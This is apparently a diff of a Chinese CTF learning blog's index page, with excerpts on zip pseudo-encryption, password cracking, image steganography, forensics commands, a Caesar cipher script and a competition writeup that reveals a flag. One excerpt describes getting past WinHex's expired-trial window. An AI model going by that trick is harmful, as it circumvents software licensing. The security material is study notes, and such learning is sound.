+这里我还在想是不是高度错误了，尝试爆破宽高不知道为 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/" title="misc压缩文件处理"><img class="post_bg" src="/picture/cover/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="misc压缩文件处理"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/" title="misc压缩文件处理">misc压缩文件处理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-01-09T02:24:30.000Z" title="Created 2022-01-09 10:24:30">2022-01-09</time></span></div><div class="content">1、伪加密如果压缩文件是加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过标识符来显示的，在每个文件的文件目录字段有一位专门标识了文件是否加密，将其设置为00表示该文件未加密，如果成功解压则表示文件为伪加密，如果解压出错说明文件为真加密
+操作方法：使用winhex或010editor，找到文件头第九第十个字符，将其修改为0000. (其中50是第一个字符)1、使用winhex打开文件搜索十六进制504B0102，可以看到每个加密文件的文件头字段2、从50开始，第九个第十个字符为加密字段，将其设置为0000即可变为无加密状态3、RAR文件由于有头部检验，使用伪加密时打开文件会出现报错，使用winhex修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，将该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密
+2、破解压缩包密码明文攻击指已经知道加密的zip中部分文件的明文内容，利用这些内容推测出密钥并解密zip文件的攻击方法，相比与暴力破解，这种方法在破解密码较为复杂的压缩包时的效率更高
+例如:假 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/01/08/misc%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" title="misc图片隐写"><img class="post_bg" src="/picture/cover/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="misc图片隐写"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/01/08/misc%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" title="misc图片隐写">misc图片隐写</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-01-08T04:23:05.000Z" title="Created 2022-01-08 12:23:05">2022-01-08</time></span></div><div class="content">1、LSB(最低有效位Least Significant Bit)LSB替换隐写基本思想使用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低位平面组成含隐藏信息的新图形
+例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像素中的最低的1bit。在人眼中看来是看不住来区别的，也把信息隐藏起来了。如：把A转成16进制的0*61在转成二进制的01100001，在修改为红色通道的最低位为这些二进制串。像素三原色(RGB)通过修改像素中最低为的1bit来达到隐藏的效果工具:stegsolve、zsteg、wbstego4(通常用于.bmp和.pdf)、Python脚本
+
+    
+      
+      
+    
+  
+因为不确定Red、Blue、Green的排列顺序，所以需要依次选择RGB、BGR……
+zsteg(这个方法很厉害)zsteg是一个命令行工具，linux下输入gem install zsteg进行安装使用:zsteg 图片名zsteg会把所有可能情况RGB、BGR……中的文本信息依次显示出来
+2、CRC检验出错当PNG文件头正常 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/01/07/misc%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E9%9A%90%E5%86%99/" title="misc文件操作"><img class="post_bg" src="/picture/cover/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="misc文件操作"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/01/07/misc%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E9%9A%90%E5%86%99/" title="misc文件操作">misc文件操作</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-01-07T11:03:46.000Z" title="Created 2022-01-07 19:03:46">2022-01-07</time></span></div><div class="content">文件类型识别、取证1、file命令当文件没有后缀名或者有后缀名而无法正常打开时，根据识别出的文件类型来修改后缀名即可正常打开文件(在Linux操作系统下使用该命令)格式:  file 文件名
+2、strings命令打印文件中可打印的字符，经常用来发现文件中的一些提示信息或是一些特殊的编码信息，常常用来发现题目的突破口配合grep命令探测指定信息：strings 文件名 | grep -i XXCTF例如：strings webshell.pcapng | grep {      #查找带有{ 的字符串      
+3、十六进制查看器通过winhex、010editor或notepad++可以查看文件头类型，根据文件头类型判断出文件类型
+
+    
+      
+      
+    
+  
+winhex试用期已过窗口绕过方法：点击details(详细)，把打开的窗格最小化之后，即可正常使用winhexnotepad++查看十六进制需要下载一个HEX-Editor插件
+4、文件头残缺/错误通常文件无法正常打开有两种情况，一种是文件头部残缺，另一种是文件头部字段错误。针对文件头部残缺的情况 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF/" title="金盾杯"><img class="post_bg" src="/picture/cover/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="金盾杯"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF/" title="金盾杯">金盾杯</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-12-12T10:54:28.000Z" title="Created 2021-12-12 18:54:28">2021-12-12</time></span></div><div class="content">这是我的第一次CTF比赛(所有writeup是我们整个队伍的writeup)
+1、hello_world拿到文件，看到只有一张图片
+
+    
+      
+      
+    
   
 
+常规操作，一般首先查看图片属性
 
-
-
-<script src="/js/script.js"></script>
-
-
+    
+      
+      
+    
   
-  <!-- 尾部用户自定义相关内容 -->
-</body>
-</html>
+
+有提示信息666c61677b35383561626436653435316134623466393665636630343036303136376264397d0~f之间，首先猜测是十六进制数（如果不行的话备选方案是Base64）十六进制转字符串得到flag{585abd6e451a4b4f96ecf04060167bd9}
+然后说一下当时我解题时候的想法我拿到一个图片，一般喜欢stegsolve
+
+    
+      
+      
+    
+  
+然后我就看啊看，看到很多类似这种的，我以为图片下面有一个二维码就打开kali
+binwalk + 文件路径/文件名
+foremost+文件路径/文件名发现并没有，然后我就不知道该怎么办了，哈哈
+
+2、Hi There拿到文件，里面只有一个txt文档Hhbe1c ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/11/29/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0/" title="古典密码原理实现"><img class="post_bg" src="/picture/cover/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="古典密码原理实现"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/29/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0/" title="古典密码原理实现">古典密码原理实现</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-11-29T09:23:46.000Z" title="Created 2021-11-29 17:23:46">2021-11-29</time></span></div><div class="content">1、ceasar
+    
+      
+      
+    
+  
+
+1234567891011121314151617cipher=&quot;zhongguo&quot;   #明文move=3              #移位数t=&quot;&quot;                #密文for i in cipher:    if &#x27;a&#x27;&lt;=i&lt;=&#x27;z&#x27;:        t+=chr(ord(&#x27;a&#x27;)+((ord(i)-ord(&#x27;a&#x27;)+move)%26))    elif &#x27;A&#x27;&lt;=i&lt;=&#x27;Z&#x27;:        t+=chr(ord(&#x27;A&#x27;)+((ord(i)-ord(&#x27;A&#x27;)+move)%26))    else:        t+=iprint(t)        #如果要解密的话，秘钥变为负数#如zhongguo加密后得到ckrqjjxr#现需要解密，则直接将move取-3即可
+ ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/11/28/Crypto%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%BD%91%E7%AB%99/" title="Crypto在线解密网站"><img class="post_bg" src="/picture/cover/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Crypto在线解密网站"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/28/Crypto%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%BD%91%E7%AB%99/" title="Crypto在线解密网站">Crypto在线解密网站</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-11-28T12:40:20.000Z" title="Created 2021-11-28 20:40:20">2021-11-28</time></span></div><div class="content">MD5MD5加密栏栅密码urlROT13morseQuoted-printable凯撒进阶凯撒爆破Rabbit分解质因数Base64Base32Base16中文电码猪圈密码UUencode十六进制转文本jsfuck解密与佛论禅与佛论禅+MD5+兽音+熊音+AES+BASE64核心价值观ROT5/13/18/47编码转换培根加密维吉尼亚加密AESUnicode、UTF-8、ASCII、URL在线汉字转拼音 
+
+</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tou.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zhangkaibin</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/zhangkaibin0921" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">一起向未来！</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/28/RSA%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86-%E4%B8%8D%E6%87%82%E5%8E%9F%E7%90%86%E7%9A%84%E9%82%A3%E7%A7%8D/" title="RSA脚本收集(不懂原理的那种)"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RSA脚本收集(不懂原理的那种)"/></a><div class="content"><a class="title" href="/2022/01/28/RSA%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86-%E4%B8%8D%E6%87%82%E5%8E%9F%E7%90%86%E7%9A%84%E9%82%A3%E7%A7%8D/" title="RSA脚本收集(不懂原理的那种)">RSA脚本收集(不懂原理的那种)</a><time datetime="2022-01-28T11:06:20.000Z" title="Created 2022-01-28 19:06:20">2022-01-28</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/01/23/webshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="webshell与文件上传漏洞">webshell与文件上传漏洞</a><time datetime="2022-01-23T10:25:37.000Z" title="Created 2022-01-23 18:25:37">2022-01-23</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/01/22/web%E5%9F%BA%E7%A1%80%E9%A2%98%E5%9E%8B/" title="web基础题型">web基础题型</a><time datetime="2022-01-22T11:32:12.000Z" title="Created 2022-01-22 19:32:12">2022-01-22</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/01/22/hgame%E7%BA%BF%E4%B8%8A%E8%B5%9B/" title="No title">No title</a><time datetime="2022-01-22T05:22:43.705Z" title="Created 2022-01-22 13:22:43">2022-01-22</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/01/18/%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E7%89%B9%E5%BE%81/" title="各种编码特征">各种编码特征</a><time datetime="2022-01-18T06:38:46.000Z" title="Created 2022-01-18 14:38:46">2022-01-18</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/Crypto/" style="font-size: 1.37em; color: #99a4b2">Crypto</a> <a href="/tags/misc/" style="font-size: 1.5em; color: #99a9bf">misc</a> <a href="/tags/re/" style="font-size: 1.1em; color: #999">re</a> <a href="/tags/web/" style="font-size: 1.23em; color: #999ea6">web</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/01/"><span class="card-archive-list-date">January 2022</span><span class="card-archive-list-count">17</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/12/"><span class="card-archive-list-date">December 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/11/"><span class="card-archive-list-date">November 2021</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/10/"><span class="card-archive-list-date">October 2021</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">22</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">Last Push :</div><div class="item-count" id="last-push-date" data-lastPushDate="2022-02-06T13:33:54.552Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By zhangkaibin</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
